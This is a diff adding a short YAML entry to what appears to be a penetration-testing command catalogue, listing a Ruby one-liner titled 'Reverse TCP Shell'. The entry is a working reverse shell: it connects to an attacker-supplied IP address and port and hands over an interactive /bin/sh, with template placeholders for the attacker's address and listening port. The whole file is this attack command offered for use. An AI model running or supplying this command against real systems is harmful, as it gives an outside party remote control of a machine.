@@ -1,0 +1,15 @@
+---
+name: ruby
+description: Interpreted object-oriented scripting language
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Reverse TCP Shell":
+    - type: ["other","NX"]
+    - text: "ruby -rsocket -e'f=TCPSocket.open(\"{IPV4}\",{INT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+...
